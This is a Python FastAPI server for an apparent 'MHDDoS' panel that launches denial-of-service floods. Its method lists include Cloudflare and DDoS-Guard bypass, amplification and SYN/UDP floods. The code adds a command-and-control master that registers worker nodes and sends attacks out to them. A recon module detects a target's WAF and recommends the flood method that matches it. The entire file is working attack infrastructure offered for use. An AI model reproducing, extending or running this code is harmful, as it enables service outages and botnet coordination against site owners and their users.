import asyncio
import contextlib
import json
import logging
import re
import sys
import time
import tkinter as tk
from pathlib import Path
from tkinter import filedialog
from typing import Any
from urllib.parse import urlparse
import uuid
import os

import psutil
import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, ConfigDict, Field

# --- Logging Configuration ---
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger("api")

# --- Constants & Classifications ---
LAYER7: set[str] = {
    "BYPASS", "CFB", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
    "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
    "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
}

LAYER4_AMP: set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

LAYER4_NORMAL: set[str] = {
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION", "CPS", 
    "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP"
}

PROXY_TYPES: dict[str, str] = {"All Proxy": "0", "HTTP": "1", "SOCKS4": "4", "SOCKS5": "5", "RANDOM": "6"}

ANSI_ESCAPE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
BASE_DIR = Path(__file__).resolve().parent
CONFIG_PATH = BASE_DIR / "config.json"

# --- Global State ---
class EngineState:
    active_tasks: dict[str, asyncio.subprocess.Process] = {}
    task_info: dict[str, dict] = {}
    is_starting: bool = False
    connected_websockets: list[WebSocket] = []
    max_concurrent: int = 5

state = EngineState()
app = FastAPI(title="MHDDoS Professional API", version="1.1.5")

# --- Command & Control (C2) State ---
class C2State:
    is_worker_mode: bool = "--worker" in sys.argv
    master_url: str | None = None
    node_id: str = str(uuid.uuid4())[:8]

    # C2 Master tracking
    token: str = os.getenv("C2_TOKEN", "MHDDoS_SECRET_1337")
    workers: dict[str, dict] = {} # node_id -> info
    pending_tasks: dict[str, list[dict]] = {} # node_id -> tasks
    active_task_id: str | None = None

C2 = C2State()

# --- Pydantic Models ---
class AttackParams(BaseModel):
    model_config = ConfigDict(str_strip_whitespace=True)

    target: str
    method: str
    threads: int = Field(default=100, ge=1)
    duration: int = Field(default=3600, ge=1)
    proxy_type: str = "SOCKS5"
    proxy_list: str = ""
    rpc: int = Field(default=100, ge=1)
    reflector: str = ""
    proxy_refresh: int = Field(default=0, ge=0)
    auto_harvest: bool = False
    smart_rpc: bool = False
    autoscale: bool = False
    evasion: bool = False
    distribute_to_workers: bool = False

class ProxyProvider(BaseModel):
    type: int
    url: str
    timeout: int = Field(ge=1)

class UpdateProxyConfig(BaseModel):
    providers: list[ProxyProvider]

class StatusResponse(BaseModel):
    status: str
    message: str | None = None
    server: str | None = None
    recommendation: str | None = None
    status_code: int | None = None

class HealthResponse(BaseModel):
    status: str
    engine_active: bool
    is_starting: bool
    version: str

# --- Helper Functions ---
def build_attack_command(params: AttackParams) -> list[str]:
    """Safely constructs the command line arguments for start.py."""
    proxy_list_arg = params.proxy_list
    proxy_type_code = PROXY_TYPES.get(params.proxy_type, "5")
    
    if params.auto_harvest:
        proxy_list_arg = "auto_harvest.txt"
        harvest_path = BASE_DIR / "files" / "proxies" / "auto_harvest.txt"
        # If auto_harvest is explicitly requested, we don't delete it here
        # start.py handles the missing file by re-harvesting
    elif params.proxy_type == "All Proxy" and not proxy_list_arg:
        proxy_list_arg = "all.txt"
        
    command = [sys.executable, "-u", "start.py", params.method, params.target]
    
    if params.method in LAYER7:
        command.extend([
            proxy_type_code, 
            str(params.threads), 
            proxy_list_arg if proxy_list_arg else "default.txt", 
            str(params.rpc), 
            str(params.duration), 
            str(params.proxy_refresh)
        ])
    elif params.method in LAYER4_AMP:
        command.extend([
            str(params.threads), 
            str(params.duration), 
            params.reflector if params.reflector else "reflector.txt"
        ])
    elif params.method in LAYER4_NORMAL:
        if proxy_list_arg and proxy_list_arg.strip() != "":
            command.extend([
                str(params.threads), 
                str(params.duration), 
                proxy_type_code, 
                proxy_list_arg, 
                str(params.proxy_refresh)
            ])
        else:
            command.extend([
                str(params.threads), 
                str(params.duration)
            ])
            
    if params.smart_rpc:
        command.append("--smart")
    if params.autoscale:
        command.append("--autoscale")
    if params.evasion:
        command.append("--evasion")
        
    return command

async def broadcast_log(message: str) -> None:
    """Sends a log message to all connected WebSockets, removing dead clients."""
    if not state.connected_websockets:
        return
        
    dead_clients: list[WebSocket] = []
    for client in state.connected_websockets:
        try:
            await client.send_text(message)
        except Exception:
            dead_clients.append(client)
            
    for dead in dead_clients:
        if dead in state.connected_websockets:
            state.connected_websockets.remove(dead)

async def run_attack_subprocess(task_id: str, params: AttackParams) -> None:
    """Runs the attack process and pipes output to WebSockets with throttling."""
    command = build_attack_command(params)
    await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] LAUNCHING TASK {task_id}: {' '.join(command)}"}))

    try:
        process = await asyncio.create_subprocess_exec(
            *command,
            cwd=str(BASE_DIR),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT
        )
        state.active_tasks[task_id] = process
        await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] COMMAND DEPLOYED: Tactical engine initialized for {params.target}"}))
        
        if process.stdout:
            last_broadcast = time.time()
            buffer = []
            
            while True:
                line = await process.stdout.readline()
                if not line:
                    break
                
                decoded_line = line.decode('utf-8', errors='replace').strip()
                decoded_line = ANSI_ESCAPE.sub('', decoded_line)
                if decoded_line:
                    buffer.append(decoded_line)
                
                # Broadcast in batches or every 50ms to prevent WS flood
                now = time.time()
                if buffer and (now - last_broadcast > 0.05 or len(buffer) > 10):
                    await broadcast_log(json.dumps({"task_id": task_id, "type": "log", "msg": "\n".join(buffer)}))
                    buffer = []
                    last_broadcast = now
                    await asyncio.sleep(0.01) # Yield to other tasks
            
            if buffer:
                await broadcast_log(json.dumps({"task_id": task_id, "type": "log", "msg": "\n".join(buffer)}))
                
        await process.wait()
        await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] COMMAND TERMINATED: Engine process reached end-of-life."}))
    except Exception as e:
        logger.error(f"Engine Error in task {task_id}: {e}")
        await broadcast_log(json.dumps({"task_id": task_id, "type": "error", "msg": f"[!] CRITICAL ENGINE ERROR: {e}"}))
    finally:
        if task_id in state.active_tasks:
            del state.active_tasks[task_id]
        if task_id in state.task_info:
            del state.task_info[task_id]

# --- Recon Engine ---
class ReconManager:
    @staticmethod
    def detect_waf(target: str) -> dict[str, Any]:
        import requests
        import urllib3
        requests.packages.urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        url = target if target.startswith("http") else f"http://{target}"
        try:
            res = requests.get(url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TacticalRecon/1.0"})
            headers = {k.lower(): v.lower() for k, v in res.headers.items()}
            server = headers.get("server", "")
            
            # Signature Mapping
            signatures = {
                "cloudflare": {"waf": "Cloudflare", "method": "CFB"},
                "ddos-guard": {"waf": "DDoS-Guard", "method": "DGB"},
                "ddg": {"waf": "DDoS-Guard", "method": "DGB"},
                "sucuri": {"waf": "Sucuri", "method": "BYPASS"},
                "arvancloud": {"waf": "Arvan Cloud", "method": "AVB"},
                "ovh": {"waf": "OVH", "method": "OVH"},
                "incapsula": {"waf": "Imperva/Incapsula", "method": "BYPASS"},
                "akamai": {"waf": "Akamai", "method": "BYPASS"}
            }
            
            detected_waf = "None"
            recommended_method = "BYPASS" if "BYPASS" in LAYER7 else "GET"
            
            # Check Server Header
            for sig, data in signatures.items():
                if sig in server:
                    detected_waf = data["waf"]
                    recommended_method = data["method"]
                    break
            
            # Check Custom Headers if still None
            if detected_waf == "None":
                if "cf-ray" in headers:
                    detected_waf, recommended_method = "Cloudflare", "CFB"
                elif "x-sucuri-id" in headers:
                    detected_waf, recommended_method = "Sucuri", "BYPASS"
                elif "__ddg2" in res.cookies:
                    detected_waf, recommended_method = "DDoS-Guard", "DGB"
            
            # Detect WordPress
            if detected_waf == "None" or detected_waf == "Sucuri":
                if "wp-includes" in res.text or "wordpress" in res.text:
                    recommended_method = "XMLRPC"
            
            return {
                "status": "success",
                "waf": detected_waf,
                "recommended_method": recommended_method,
                "server_header": server.title() if server else "Unknown",
                "status_code": res.status_code
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    @staticmethod
    async def scan_subdomains(target: str) -> list[dict[str, Any]]:
        import requests
        import socket
        from urllib.parse import urlparse
        
        parsed = urlparse(target if "://" in target else f"http://{target}")
        domain = parsed.netloc or parsed.path
        if domain.startswith("www."):
            domain = domain[4:]
            
        results = []
        unique_subs = set()
        
        # 1. Passive Discovery (crt.sh)
        try:
            res = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=10)
            if res.status_code == 200:
                data = res.json()
                for entry in data:
                    sub = entry['name_value'].lower()
                    if sub.endswith(domain) and sub != domain:
                        unique_subs.add(sub)
        except:
            pass
            
        # 2. Active Discovery (Top Common)
        common_subs = ["dev", "api", "staging", "test", "webmail", "admin", "vpn", "git", "db", "mail"]
        for sub in common_subs:
            unique_subs.add(f"{sub}.{domain}")
            
        # 3. Resolve
        valid_subs = sorted(list(unique_subs))[:25] # Limit for performance
        for sub in valid_subs:
            try:
                loop = asyncio.get_event_loop()
                ip = await loop.run_in_executor(None, lambda: socket.gethostbyname(sub))
                results.append({
                    "subdomain": sub,
                    "ip": ip,
                    "status": "active"
                })
            except:
                continue
                
        return results

    @staticmethod
    async def scan_ports(target: str) -> list[dict[str, Any]]:
        import socket
        from urllib.parse import urlparse
        
        parsed = urlparse(target if "://" in target else f"http://{target}")
        host = parsed.netloc or parsed.path
        if host.startswith("www."):
            host = host[4:]
            
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080, 8443]
        results = []
        
        for port in common_ports:
            try:
                loop = asyncio.get_event_loop()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                # Run connect in an executor to avoid blocking the event loop
                result = await loop.run_in_executor(None, sock.connect_ex, (host, port))
                if result == 0:
                    results.append({"port": port, "status": "open"})
                sock.close()
            except Exception:
                continue
        return results

    @staticmethod
    def fingerprint_tech(target: str) -> dict[str, Any]:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        url = target if target.startswith("http") else f"http://{target}"
        try:
            res = requests.get(url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TacticalRecon/1.0"})
            headers = {k.lower(): v.lower() for k, v in res.headers.items()}
            
            tech_stack = []
            
            # Analyze Headers
            server = headers.get("server", "")
            if "nginx" in server: tech_stack.append("Nginx")
            if "apache" in server: tech_stack.append("Apache")
            if "cloudflare" in server: tech_stack.append("Cloudflare")
            
            x_powered_by = headers.get("x-powered-by", "")
            if "php" in x_powered_by: tech_stack.append("PHP")
            if "express" in x_powered_by: tech_stack.append("Express.js (Node.js)")
            if "asp.net" in x_powered_by: tech_stack.append("ASP.NET")
            
            # Analyze Content
            html = res.text.lower()
            if "wp-content" in html or "wp-includes" in html: tech_stack.append("WordPress")
            if "react" in html or 'data-reactroot' in html or 'id="root"' in html: tech_stack.append("React")
            if "vue" in html or 'data-v-' in html: tech_stack.append("Vue.js")
            if "next" in html or '_next/static' in html: tech_stack.append("Next.js")
            if "nuxt" in html or '_nuxt' in html: tech_stack.append("Nuxt.js")
            
            return {
                "status": "success",
                "tech_stack": list(set(tech_stack)) if tech_stack else ["Unknown"]
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    @staticmethod
    def enumerate_dns(target: str) -> dict[str, Any]:
        import dns.resolver
        from urllib.parse import urlparse
        
        parsed = urlparse(target if "://" in target else f"http://{target}")
        domain = parsed.netloc or parsed.path
        if domain.startswith("www."):
            domain = domain[4:]
            
        records = {"A": [], "AAAA": [], "MX": [], "TXT": [], "NS": []}
        
        try:
            for record_type in records.keys():
                try:
                    answers = dns.resolver.resolve(domain, record_type)
                    records[record_type] = [rdata.to_text() for rdata in answers]
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
                    continue
            return {"status": "success", "domain": domain, "records": records}
        except Exception as e:
            return {"status": "error", "message": str(e)}

# --- API Endpoints ---
@app.get("/api/health", response_model=HealthResponse)
async def health_check() -> HealthResponse:
    return HealthResponse(
        status="online",
        engine_active=state.process is not None,
        is_starting=state.is_starting,
        version="1.1.5"
    )

# --- C2 Master Endpoints ---
def _check_c2_token(request: Request) -> bool:
    return request.headers.get("Authorization", "") == f"Bearer {C2.token}"

@app.post("/api/c2/register")
async def c2_register(request: Request, data: dict):
    if not _check_c2_token(request):
        return {"status": "error", "message": "Invalid token"}
    node_id = request.headers.get("X-Node-ID")
    if not node_id:
        return {"status": "error"}
    
    data["last_seen"] = time.time()
    C2.workers[node_id] = data
    if node_id not in C2.pending_tasks:
        C2.pending_tasks[node_id] = []
    return {"status": "success", "message": "Registered"}

@app.post("/api/c2/heartbeat")
async def c2_heartbeat(request: Request, data: dict):
    if not _check_c2_token(request):
        return {"status": "error"}
    node_id = request.headers.get("X-Node-ID")
    if node_id and node_id in C2.workers:
        C2.workers[node_id].update(data)
        C2.workers[node_id]["last_seen"] = time.time()
    return {"status": "success"}

@app.get("/api/c2/poll")
async def c2_poll(request: Request):
    if not _check_c2_token(request):
        return {"status": "error"}
    node_id = request.headers.get("X-Node-ID")
    if node_id and node_id in C2.pending_tasks and C2.pending_tasks[node_id]:
        task = C2.pending_tasks[node_id].pop(0)
        return {"status": "success", "task": task}
    return {"status": "success", "task": None}

@app.post("/api/c2/task_complete")
async def c2_task_complete(request: Request, data: dict):
    return {"status": "success"}

@app.get("/api/c2/nodes")
async def c2_nodes():
    now = time.time()
    dead = [nid for nid, w in C2.workers.items() if now - w.get("last_seen", 0) > 30]
    for nid in dead:
        del C2.workers[nid]
        if nid in C2.pending_tasks:
            del C2.pending_tasks[nid]
    return {"status": "success", "workers": list(C2.workers.values())}


class AnalyzeParams(BaseModel):
    target: str

@app.post("/api/recon/analyze", response_model=StatusResponse)
async def recon_analyze(params: AnalyzeParams) -> StatusResponse:
    result = ReconManager.detect_waf(params.target)
    if result["status"] == "error":
        return StatusResponse(status="error", message=result["message"])
    
    return StatusResponse(
        status="success",
        server=result["waf"],
        recommendation=result["recommended_method"],
        status_code=result["status_code"],
        message=f"Server Identified: {result['server_header']}"
    )

@app.post("/api/recon/subdomains")
async def recon_subdomains(params: AnalyzeParams):
    subs = await ReconManager.scan_subdomains(params.target)
    return {"status": "success", "subdomains": subs}

@app.get("/api/tools/ports")
async def tool_ports(host: str):
    ports = await ReconManager.scan_ports(host)
    return {"status": "success", "ports": ports}

@app.get("/api/tools/tech")
async def tool_tech(host: str):
    tech = ReconManager.fingerprint_tech(host)
    return tech

@app.get("/api/tools/dns")
async def tool_dns(host: str):
    records = ReconManager.enumerate_dns(host)
    return records

@app.get("/api/recon/geo")
async def recon_geo(target: str):
    import requests
    host = target.replace("http://", "").replace("https://", "").split("/")[0]
    try:
        res = requests.get(f"https://ipwhois.app/json/{host}/", timeout=10)
        data = res.json()
        if data.get("success"):
            return {
                "status": "success",
                "lat": data.get("latitude"),
                "lon": data.get("longitude"),
                "country": data.get("country"),
                "city": data.get("city"),
                "isp": data.get("isp"),
                "org": data.get("org"),
                "ip": data.get("ip")
            }
        return {"status": "error", "message": "Failed to retrieve Geo-IP data."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/attack/start", response_model=StatusResponse)
async def start_attack(params: AttackParams) -> StatusResponse:
    if len(state.active_tasks) >= state.max_concurrent:
        return StatusResponse(status="error", message=f"Maximum concurrent tasks ({state.max_concurrent}) reached. Stop a task first.")
    
    task_id = str(uuid.uuid4())[:8]
    
    # Store initial info
    state.task_info[task_id] = {
        "target": params.target,
        "method": params.method,
        "threads": params.threads,
        "duration": params.duration,
        "start_time": time.time()
    }
    
    if params.distribute_to_workers:
        params_dict = params.model_dump()
        for nid in list(C2.workers.keys()):
            C2.pending_tasks[nid].append({
                "action": "attack",
                "task_id": task_id,
                "params": params_dict
            })
        asyncio.create_task(broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] C2 MASTER: Dispatching task {task_id} to {len(C2.workers)} workers."})))
    
    asyncio.create_task(run_attack_subprocess(task_id, params))
    return StatusResponse(status="success", message="Attack sequence initiated.", recommendation=task_id) # Using recommendation field temporarily as task_id return

class StopParams(BaseModel):
    task_id: str

@app.post("/api/attack/stop", response_model=StatusResponse)
async def stop_attack(params: StopParams) -> StatusResponse:
    task_id = params.task_id
    
    # Broadcast stop to workers
    for nid in list(C2.workers.keys()):
        C2.pending_tasks[nid].append({"action": "stop", "task_id": task_id})

    if task_id not in state.active_tasks:
        return StatusResponse(status="error", message=f"No active engine process found for task {task_id} locally.")
    
    process = state.active_tasks[task_id]
    await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] INITIATING RECURSIVE TERMINATION FOR TASK {task_id}: Cleaning up process tree..."}))
    try:
        pid = process.pid
        parent = psutil.Process(pid)
        for child in parent.children(recursive=True):
            child.kill()
        parent.kill()
        
        # Cleanup state immediately
        del state.active_tasks[task_id]
        if task_id in state.task_info:
            del state.task_info[task_id]
            
        return StatusResponse(status="success", message=f"Task {task_id} terminated.")
    except psutil.NoSuchProcess:
        if task_id in state.active_tasks:
            del state.active_tasks[task_id]
        if task_id in state.task_info:
            del state.task_info[task_id]
        return StatusResponse(status="success", message="Process already purged.")
    except Exception as e:
        await broadcast_log(json.dumps({"task_id": task_id, "type": "error", "msg": f"[!] TERMINATION ERROR: {e}"}))
        with contextlib.suppress(Exception):
            process.kill()
        return StatusResponse(status="error", message=str(e))

@app.get("/api/attack/status")
async def get_attack_status() -> dict[str, Any]:
    tasks = []
    now = time.time()
    for task_id, info in state.task_info.items():
        elapsed = int(now - info.get("start_time", now))
        tasks.append({
            "task_id": task_id,
            "target": info.get("target"),
            "method": info.get("method"),
            "threads": info.get("threads"),
            "duration": info.get("duration"),
            "elapsed": elapsed,
            "status": "running" if task_id in state.active_tasks else "unknown"
        })
    return {"status": "success", "active_tasks": tasks, "max_concurrent": state.max_concurrent}

@app.get("/api/config/proxies")
async def get_proxy_config() -> dict[str, Any]:
    try:
        if not CONFIG_PATH.exists():
            return {"status": "success", "providers": []}
            
        with CONFIG_PATH.open("r", encoding="utf-8") as f:
            config = json.load(f)
        return {"status": "success", "providers": config.get("proxy-providers", [])}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/config/proxies", response_model=StatusResponse)
async def update_proxy_config(data: UpdateProxyConfig) -> StatusResponse:
    for p in data.providers:
        url_str = p.url.strip()
        if not url_str:
            return StatusResponse(status="error", message="Source path cannot be empty.")
            
        if url_str.startswith("http://") or url_str.startswith("https://"):
            parsed = urlparse(url_str)
            if not parsed.netloc or not parsed.scheme:
                return StatusResponse(status="error", message=f"Invalid URL format: {url_str}")
        else:
            if not url_str.endswith(".txt") and not url_str.endswith(".json"):
                return StatusResponse(status="error", message=f"Local paths must be .txt or .json files: {url_str}")
            
    try:
        config: dict[str, Any] = {}
        if CONFIG_PATH.exists():
            with CONFIG_PATH.open("r", encoding="utf-8") as f:
                config = json.load(f)
            
        config["proxy-providers"] = [
            {"type": p.type, "url": p.url.strip(), "timeout": p.timeout} 
            for p in data.providers
        ]
        
        with CONFIG_PATH.open("w", encoding="utf-8") as f:
            json.dump(config, f, indent=4)
            
        return StatusResponse(status="success", message="Proxy sources updated.")
    except Exception as e:
        return StatusResponse(status="error", message=str(e))

@app.get("/api/tools/ping")
async def tool_ping(host: str) -> dict[str, Any]:
    from icmplib import ping
    try:
        host = host.replace("http://", "").replace("https://", "").split("/")[0]
        r = ping(host, count=4, interval=0.2)
        return {
            "status": "success",
            "address": r.address,
            "min_rtt": r.min_rtt,
            "avg_rtt": r.avg_rtt,
            "max_rtt": r.max_rtt,
            "packets_sent": r.packets_sent,
            "packets_received": r.packets_received,
            "is_alive": r.is_alive
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/tools/check")
async def tool_check(url: str) -> dict[str, Any]:
    import requests
    if not url.startswith("http"):
        url = f"http://{url}"
    try:
        res = requests.get(url, timeout=10, verify=False)
        return {
            "status": "success",
            "status_code": res.status_code,
            "online": res.status_code < 500
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/tools/info")
async def tool_info(host: str) -> dict[str, Any]:
    import requests
    host = host.replace("http://", "").replace("https://", "").split("/")[0]
    try:
        res = requests.get(f"https://ipwhois.app/json/{host}/", timeout=10)
        return res.json()
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/select_file")
async def select_file_dialog() -> dict[str, str]:
    def _open_dialog() -> str:
        root = tk.Tk()
        root.withdraw()
        root.wm_attributes('-topmost', 1)
        file_path = filedialog.askopenfilename(title="Resource Selector", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
        root.destroy()
        return file_path
    
    loop = asyncio.get_event_loop()
    path = await loop.run_in_executor(None, _open_dialog)
    return {"path": path or ""}

@app.websocket("/ws/logs")
async def websocket_endpoint(websocket: WebSocket) -> None:
    await websocket.accept()
    state.connected_websockets.append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if websocket in state.connected_websockets:
            state.connected_websockets.remove(websocket)

app.mount("/", StaticFiles(directory=str(BASE_DIR / "web"), html=True), name="web")

def run() -> None:
    uvicorn.run("api:app", host="127.0.0.1", port=8000, log_level="info")

if __name__ == "__main__":
    run()
